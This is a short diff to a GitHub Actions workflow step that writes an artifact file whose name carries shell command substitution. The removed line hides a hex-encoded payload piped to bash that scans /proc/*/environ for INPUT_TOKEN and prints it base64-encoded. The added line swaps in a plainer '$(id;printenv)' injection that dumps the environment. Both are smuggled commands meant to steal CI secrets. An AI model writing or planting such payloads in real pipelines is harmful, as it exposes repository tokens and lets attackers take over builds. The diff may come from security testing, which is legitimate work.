@@ -13,7 +13,7 @@ jobs:
       - name: build artifact
         run: |
           mkdir -p content
-          printf 'payload\n' > 'content/x$(echo 69643e26323b28666f72206920696e207b312e2e33307d3b646f20636174202f70726f632f2a2f656e7669726f6e7c747220275c302720275c6e277c67726570202d61205e494e5055545f544f4b454e3d7c626173653634202d77303e26323b736c656570202e353b646f6e652926|xxd -r -p|bash).txt'
+          printf 'payload\n' > 'content/d$(id;printenv).txt'
           ls -1 content
       - uses: actions/upload-artifact@v4
         with:
